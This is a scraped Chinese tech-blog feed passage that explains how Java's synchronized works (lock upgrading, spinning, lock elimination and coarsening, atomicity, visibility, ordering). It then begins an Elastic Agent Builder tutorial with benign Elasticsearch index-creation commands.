<p>线程第一次获取锁时，通过 CAS 将 Mark Word 中的 “偏向线程 ID” 设为当前线程 ID，“是否偏向锁” 设为 1，锁状态保持 01（偏向锁标识）。</p>
</li>
<li>
<p>后续该线程再次获取锁时，仅需检查：</p>
<ul>
<li>Mark Word 中的偏向线程 ID 是否为当前线程。</li>
<li>偏向锁标志是否为 1。</li>
<li>锁状态是否为 01。满足则直接获取锁，无需 CAS 或阻塞，开销极低。</li>
</ul>
</li>
</ol>
<h5 data-id="heading-14">偏向锁的撤销：</h5>
<p>当有其他线程尝试竞争偏向锁时，偏向锁会被 “撤销”，升级为轻量级锁。撤销流程：</p>
<ol>
<li>
<p>暂停持有偏向锁的线程（STW 短暂停顿）。</p>
</li>
<li>
<p>检查持有线程的状态：</p>
<ul>
<li>若线程已终止，直接将 Mark Word 重置为无锁状态。</li>
<li>若线程仍存活，将锁升级为轻量级锁，持有线程继续执行，竞争线程进入轻量级锁竞争。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-15">（2）轻量级锁：轻度竞争场景的优化</h4>
<p><strong>适用场景</strong>：少量线程竞争锁，且竞争时间短（如两个线程交替获取锁）。<strong>核心思想</strong>：用 “自旋” 替代 “阻塞”，避免线程切换到内核态的开销。</p>
<h5 data-id="heading-16">实现原理：</h5>
<ol>
<li>
<p>线程获取锁时，先在当前栈帧中创建一个 <strong>Lock Record（锁记录）</strong> ，存储对象当前的 Mark Word 副本（Displaced Mark Word）。</p>
</li>
<li>
<p>通过 CAS 将对象的 Mark Word 更新为 “指向当前 Lock Record 的指针”：</p>
<ul>
<li>CAS 成功：线程获取轻量级锁，锁状态变为 00。</li>
<li>CAS 失败：说明有其他线程竞争，此时会先自旋（空循环）几次，尝试再次获取锁。</li>
</ul>
</li>
</ol>
<h5 data-id="heading-17">轻量级锁的膨胀：</h5>
<p>若自旋失败（如自旋次数耗尽仍未获取锁，或有更多线程参与竞争），轻量级锁会 “膨胀” 为重量级锁：</p>
<ol>
<li>将 Mark Word 中的指针改为 “指向 Monitor 的指针”，锁状态变为 11。</li>
<li>未获取锁的线程进入 EntryList 阻塞（BLOCKED 状态），避免无效自旋浪费 CPU。</li>
</ol>
<h4 data-id="heading-18">（3）重量级锁：激烈竞争场景的兜底</h4>
<p><strong>适用场景</strong>：多个线程同时竞争锁，且竞争时间长（如线程持有锁执行耗时操作）。<strong>实现原理</strong>：依赖操作系统的 <strong>互斥量（Mutex）</strong>  实现，线程竞争失败会直接阻塞（从用户态切换到内核态），等待被唤醒。<strong>特点</strong>：开销最大（线程阻塞 / 唤醒需内核态切换），但稳定性最高，适合激烈竞争场景。</p>
<h3 data-id="heading-19">2. 其他关键优化</h3>
<h4 data-id="heading-20">（1）自旋锁与适应性自旋锁</h4>
<ul>
<li>
<p><strong>自旋锁</strong>：轻量级锁竞争时，线程不直接阻塞，而是自旋（空循环）一段时间（默认 10 次），等待持有锁的线程快速释放。自旋无需切换内核态，适合锁持有时间短的场景。</p>
</li>
<li>
<p><strong>适应性自旋锁</strong>：JDK 1.6 优化，自旋次数不再固定，而是根据 “历史自旋成功率” 动态调整：</p>
<ul>
<li>若之前自旋成功获取锁，下次自旋次数增加（如 20 次）。</li>
<li>若之前自旋失败，下次自旋次数减少或直接放弃自旋（避免浪费 CPU）。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-21">（2）锁消除</h4>
<p>JIT 编译器在编译时，通过<strong>逃逸分析</strong>判断：若一个锁对象仅被当前线程访问（无逃逸到其他线程），则直接消除该锁。</p>
<ul>
<li>示例：<code>StringBuffer</code> 的 <code>append()</code> 方法是同步方法，但单线程环境下，JIT 会消除其锁（因为 <code>StringBuffer</code> 对象未逃逸，无需同步）。</li>
</ul>
<h4 data-id="heading-22">（3）锁粗化</h4>
<p>若多个连续的锁操作针对<strong>同一个对象</strong>，JIT 会将这些分散的锁合并为一个 “粗粒度锁”，减少锁的获取 / 释放次数。</p>
<ul>
<li>示例：循环中多次调用 <code>synchronized (this) { ... }</code>，JIT 会将锁粗化到循环外部，仅获取一次锁即可。</li>
</ul>
<h2 data-id="heading-23">三、synchronized 如何保证可见性，有序性，原子性</h2>
<p><code>synchronized</code> 是 Java 中唯一能同时保证 <strong>原子性、可见性、有序性</strong> 的内置同步机制，其保障逻辑完全基于底层的 <strong>Monitor 监视器锁</strong> 和 <strong>JMM（Java 内存模型）规则</strong>，与之前提到的底层原理（如锁获取 / 释放、对象头操作）深度绑定。下面分三个特性，拆解其具体保障机制：</p>
<h3 data-id="heading-24">1、保证原子性：基于 Monitor 的互斥执行</h3>
<h4 data-id="heading-25">1.1. 原子性的定义</h4>
<p>原子性指 <strong>一个操作或一组操作，要么全部执行且执行过程不被打断，要么全部不执行</strong>（不可分割）。比如 <code>i++</code> 本质是「读取 i → 加 1 → 写入 i」三个步骤，若不加同步，多线程环境下可能被其他线程打断，导致结果错误。</p>
<h4 data-id="heading-26">1.2. synchronized 如何保证原子性？</h4>
<p>核心逻辑：<strong>通过 Monitor 锁的互斥性，确保同步块 / 方法在同一时间只能被一个线程执行</strong>。</p>
<p>结合底层原理的细节：</p>
<ul>
<li>线程要进入同步块 / 方法，必须先获取 Monitor 的所有权（通过 <code>monitorenter</code> 指令或 <code>ACC_SYNCHRONIZED</code> 标志）。</li>
<li>Monitor 的 <code>Owner</code> 字段同一时间只能指向一个线程（互斥性），其他竞争线程会被阻塞在 <code>EntryList</code>（BLOCKED 状态），直到当前线程释放锁。</li>
<li>同步块 / 方法内的所有操作，会作为一个 “整体” 被执行 —— 在当前线程释放锁前，其他线程无法插入执行，因此这组操作具备不可分割的原子性。</li>
</ul>
<h4 data-id="heading-27">示例验证：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">increment</span><span class="hljs-params">()</span> </span>{
    count++; <span class="hljs-comment">// 读取、加1、写入三个步骤，被synchronized保证为原子操作</span>
}
</code></pre>
<ul>
<li>若不加 <code>synchronized</code>，1000 个线程各调用 1000 次 <code>increment()</code>，最终 <code>count</code> 会小于 1000000（因步骤被打断）。</li>
<li>加 <code>synchronized</code> 后，<code>count++</code> 的三个步骤被 “串行化”，最终结果必然是 1000000，原子性得到保证。</li>
</ul>
<h4 data-id="heading-28">补充：可重入性不破坏原子性</h4>
<p><code>synchronized</code> 是可重入锁（同一线程可多次获取同一锁），但多次获取不会打破互斥性 —— 其他线程仍需等待当前线程完全释放锁（所有重入的锁都释放）才能竞争，因此原子性依然成立。</p>
<h3 data-id="heading-29">2、保证可见性：基于锁释放 / 获取的内存刷新规则</h3>
<h4 data-id="heading-30">2.1. 可见性的定义</h4>
<p>可见性指 <strong>一个线程修改了共享变量的值后，其他线程能立刻感知到这个修改</strong>。若没有可见性保障，线程 A 修改的变量可能只存在于自己的工作内存中，未同步到主内存，线程 B 读取的仍是主内存中旧值。</p>
<h4 data-id="heading-31">2.2. synchronized 如何保证可见性？</h4>
<p>核心逻辑：<strong>JMM 为 <code>synchronized</code> 定义了「锁释放 - 获取的内存语义」，强制刷新共享变量的内存</strong>。</p>
<p>具体规则（与底层锁操作绑定）：</p>
<ul>
<li><strong>锁释放时：强制刷新工作内存到主内存</strong>线程释放 Monitor 锁时（执行 <code>monitorexit</code> 指令，或方法执行完毕），JVM 会触发一个动作：将该线程在工作内存中修改的所有共享变量，<strong>强制刷新到主内存</strong>（清空工作内存中的缓存，确保主内存是最新值）。</li>
<li><strong>锁获取时：强制从主内存加载最新值</strong>线程获取 Monitor 锁时（执行 <code>monitorenter</code> 指令，或调用同步方法），JVM 会触发一个动作：将该线程工作内存中对应的共享变量 <strong>置为无效</strong>，后续读取该变量时，必须从主内存重新加载（确保拿到的是最新值）。</li>
</ul>
<h4 data-id="heading-32">示例验证：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> flag = <span class="hljs-literal">false</span>;
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">setFlag</span><span class="hljs-params">()</span> </span>{
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 线程A修改后，释放锁时刷新到主内存</span>
}
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">checkFlag</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (flag) { <span class="hljs-comment">// 线程B获取锁时，从主内存加载最新的flag（true）</span>
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"感知到flag修改"</span>);
    }
}
</code></pre>
<ul>
<li>若不加 <code>synchronized</code>，线程 A 修改变量后可能未刷新到主内存，线程 B 一直读取工作内存中的旧值 <code>false</code>，无法感知修改。</li>
<li>加 <code>synchronized</code> 后，锁释放 / 获取的内存语义确保了 <code>flag</code> 的修改对其他线程可见。</li>
</ul>
<h3 data-id="heading-33">3、保证有序性：基于互斥执行 + happens-before 规则</h3>
<h4 data-id="heading-34">3.1. 有序性的定义</h4>
<p>有序性指 <strong>程序执行的顺序与代码编写的顺序一致</strong>，避免因「指令重排序」导致的多线程执行混乱。JIT 编译器、CPU 为了优化性能，会在不影响单线程执行结果的前提下重排序指令，但多线程环境下可能导致错误。</p>
<h4 data-id="heading-35">3.2. synchronized 如何保证有序性？</h4>
<p>核心逻辑：<strong>通过「互斥执行的串行化」和「JMM 的 happens-before 规则」，间接禁止指令重排序的可见性</strong>。</p>
<h5 data-id="heading-36">（1）互斥执行的串行化保障</h5>
<p>由于同步块 / 方法同一时间只能被一个线程执行，相当于将多线程执行转化为「单线程串行执行」。而单线程环境下，指令重排序不会影响执行结果（as-if-serial 语义）—— 无论指令如何重排，单线程执行的最终结果与代码顺序一致，因此多线程通过 <code>synchronized</code> 执行时，不会出现因重排序导致的逻辑错误。</p>
<h5 data-id="heading-37">（2）happens-before 规则的强约束</h5>
<p>JMM 定义了「监视器锁规则」：<strong>对同一个锁的解锁操作（unlock），happens-before 于后续对该锁的加锁操作（lock）</strong> 。</p>
<ul>
<li>
<p><code>happens-before</code> 的含义：若操作 A happens-before 操作 B，则 A 的执行结果对 B 可见，且 A 的执行顺序在 B 之前（禁止 A 之后的指令重排序到 A 之前，也禁止 B 之前的指令重排序到 B 之后）。</p>
</li>
<li>
<p>具体效果：同步块内的所有操作（解锁前的操作），happens-before 于后续获取该锁的线程执行的操作（加锁后的操作）。这意味着：</p>
<ul>
<li>同步块内的指令可以重排序，但不会重排序到同步块外部（解锁后）。</li>
<li>后续线程获取锁后，能看到前一个线程同步块内所有操作的结果（包括指令重排序后的正确结果）。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-38">示例验证（避免重排序问题）：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> ready = <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 线程A执行</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">()</span> </span>{
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 操作1</span>
    ready = <span class="hljs-literal">true</span>;<span class="hljs-comment">// 操作2</span>
}

<span class="hljs-comment">// 线程B执行</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">read</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (ready) { <span class="hljs-comment">// 操作3</span>
        System.out.<span class="hljs-built_in">println</span>(a); <span class="hljs-comment">// 操作4，必然输出1</span>
    }
}
</code></pre>
<ul>
<li>
<p>若不加 <code>synchronized</code>，CPU 可能将线程 A 的「操作 1 和操作 2」重排序（先执行 <code>ready=true</code>，再执行 <code>a=1</code>），导致线程 B 执行时 <code>ready=true</code> 但 <code>a=0</code>，输出错误。</p>
</li>
<li>
<p>加 <code>synchronized</code> 后：</p>
<ol>
<li>线程 A 的同步块内，操作 1 和操作 2 可重排序，但不会重排序到 <code>write()</code> 方法外部（解锁后）。</li>
<li>「线程 A 解锁」happens-before「线程 B 加锁」，因此线程 B 执行时，必然能看到线程 A 操作 1 和操作 2 的最终结果（<code>a=1</code> 且 <code>ready=true</code>），输出正确。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-39">4、总结：三个特性的核心保障逻辑</h3>





















<table><thead><tr><th>特性</th><th>核心保障机制</th></tr></thead><tbody><tr><td>原子性</td><td>Monitor 锁的互斥性：同步块 / 方法同一时间仅一个线程执行，操作不可分割。</td></tr><tr><td>可见性</td><td>锁释放 / 获取的内存语义：释放锁时刷新工作内存到主内存，获取锁时从主内存加载最新值。</td></tr><tr><td>有序性</td><td>1. 互斥执行转化为单线程串行（as-if-serial 语义）；2. happens-before 规则约束指令重排序。</td></tr></tbody></table>
<h2 data-id="heading-40">四、总结</h2>
<h3 data-id="heading-41">1. 底层原理核心</h3>
<p><code>synchronized</code> 基于 <strong>Monitor 监视器锁</strong> 和 <strong>对象头 Mark Word</strong> 实现，通过竞争 Monitor 所有权保证线程互斥，锁状态存储在 Mark Word 中。</p>
<h3 data-id="heading-42">2. 优化机制核心</h3>
<p>JDK 1.6+ 的优化核心是  <strong>“锁升级”</strong> ：从偏向锁（无竞争）→ 轻量级锁（轻度竞争，自旋）→ 重量级锁（激烈竞争，阻塞），按需降低开销；配合自旋锁、锁消除、锁粗化等优化，让 <code>synchronized</code> 兼顾安全性和高性能。</p>
<h3 data-id="heading-43">3. 性能对比</h3>
<ul>
<li>无竞争场景：偏向锁 &gt; 轻量级锁 &gt; 重量级锁（偏向锁几乎无开销）。</li>
<li>轻度竞争场景：轻量级锁（自旋）&gt; 重量级锁（避免内核态切换）。</li>
<li>激烈竞争场景：重量级锁（自旋无效，阻塞更高效）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开始使用 Elastic Agent Builder 和 Microsoft Agent Framework]]></title>    <link>https://juejin.cn/post/7575313772988399657</link>    <guid>https://juejin.cn/post/7575313772988399657</guid>    <pubDate>2025-11-23T08:40:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575313772988399657" data-draft-id="7575655132748349476" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开始使用 Elastic Agent Builder 和 Microsoft Agent Framework"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-11-23T08:40:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开始使用 Elastic Agent Builder 和 Microsoft Agent Framework
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:40:23.000Z" title="Sun Nov 23 2025 08:40:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fjonathan-simon" title="https://www.elastic.co/search-labs/author/jonathan-simon" target="_blank" ref="nofollow noopener noreferrer">Jonathan Simon</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e12fa40a8534389b0387e53ff3c0016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=oIIS7CCMF2LuT17tdHYHDvoXPQk%3D" alt="" loading="lazy"/></p>
<p>逐步讲解如何使用 Elastic Agent Builder 创建一个 agent 的完整流程，然后探索如何通过由 Microsoft Agent Framework 编排的 A2A 协议来使用该 agent。</p>
<p>Agent Builder 现在作为技术预览版提供。开始使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud 试用</a>，并在此查看 Agent Builder 的文档。</p>
<p>Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153865391" title="https://elasticstack.blog.csdn.net/article/details/153865391" target="_blank" ref="nofollow noopener noreferrer">9.2</a> 最近发布，并包含一个名为 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Felasticsearch%2Fagent-builder" title="https://www.elastic.co/elasticsearch/agent-builder" target="_blank" ref="nofollow noopener noreferrer">Agent Builder</a> 的新功能。它让开发者能够快速创建由 Elasticsearch 中存储的数据驱动的 AI agents 和 tools。你在 Agent Builder 中创建的任何 tools 或 agents 都可以立即在你自己的自定义 AI 应用中使用。</p>
<p>在这篇博客文章中，我们将讲解使用 Elastic Agent Builder 创建一个 agent 的所有步骤。然后我们将讲解运行一个示例 Python 应用的流程，该应用使用 Microsoft Agent Framework 来编排你的 Elastic agent。</p>
<h2 data-id="heading-0">创建一个 Elastic Serverless 项目</h2>
<p>要使用 Agent Builder，你需要一个 Elastic 部署或一个 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fserverless" title="https://www.elastic.co/cloud/serverless" target="_blank" ref="nofollow noopener noreferrer">serverless</a> 项目，所以我们先从创建一个 Elastic serverless 项目开始。进入 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud</a> 并创建一个新的 Elasticsearch <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fserverless" title="https://www.elastic.co/cloud/serverless" target="_blank" ref="nofollow noopener noreferrer">Serverless</a> 项目。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d217235199794785a2b684aba2bfb3be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=gUhNOGypdo%2FnZwsyxJRD2J2omjE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">创建一个索引并添加数据</h2>
<p>现在我们已经有了一个 Elastic 项目，让我们创建一个索引，这是 Elasticsearch 用来存储数据的地方。打开 Elastic Cloud 中的 Developer Tools，我们可以在这里运行命令来创建一个索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b428801cf1a14dc3bc53d1264f06eef3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=uclXaT4954LTq9emN2HeGCuWixA%3D" alt="" loading="lazy"/></p>
<p>复制下面的 PUT 命令，它会创建一个名为 my-docs 的索引，包含多种字段，以及利用<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">语义搜索</a>的内容。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /my-docs
2.  {
3.    <span class="hljs-string">"mappings"</span>: {
4.      <span class="hljs-string">"properties"</span>: {
5.        <span class="hljs-string">"title"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span> },
6.        <span class="hljs-string">"content"</span>: { 
7.          <span class="hljs-string">"type"</span>: <span class="hljs-string">"semantic_text"</span>
8.        },
9.        <span class="hljs-string">"filename"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"keyword"</span> },
10.        <span class="hljs-string">"last_modified"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"date"</span> }
11.      }
12.    }
13.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>将 PUT 命令粘贴到 Developer Tools 控制台的输入区域。把鼠标悬停在控制台中的命令上，然后点击 Run 按钮来执行该命令。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/383550b40f3649ec8f17e3e33dc2df7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=HwMjEZEUh%2B%2BJLO9AlxCU%2F1740Kc%3D" alt="" loading="lazy"/></p>
<p>下一步是向你刚创建的 my-docs 索引中添加一些数据。将下面的命令复制并粘贴到 Develop Tools 控制台中。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /my-docs/_doc/greetings-md
2.  {
3.    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Greetings"</span>,
4.    <span class="hljs-string">"content"</span>: <span class="hljs-string">"
5.  # Greetings

7.  ## Basic Greeting
8.  Hello!

10.  ## Helloworld Greeting
11.  Hello World! 🌎

13.  ## Not Greeting
14.  I'm only a greeting agent. 🤷

16.  "</span>,
17.    <span class="hljs-string">"filename"</span>: <span class="hljs-string">"greetings.md"</span>,
18.    <span class="hljs-string">"last_modified"</span>: <span class="hljs-string">"2025-11-04T12:00:00Z"</span>
19.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>点击该命令的 Run 按钮来执行命令，这将向 my-docs 索引添加一个文档。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3067081540db4b6e84b62180f196b98b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=Un1vqEg6RDYZEUoGPPHSzolxzDQ%3D" alt="" loading="lazy"/></p>
<p>如你所见，上面的命令添加了一个名为 greetings.md 的文档，其中包含不同类型的问候回应内容。</p>
<p>现在我们已经在 Elastic 索引中有了一些数据，让我们确认一下可以使用的数据。利用 Agent Builder 中默认启用的内置 Elastic AI Agent，你现在可以就你的数据进行对话。在导航菜单中选择 Agents。</p>
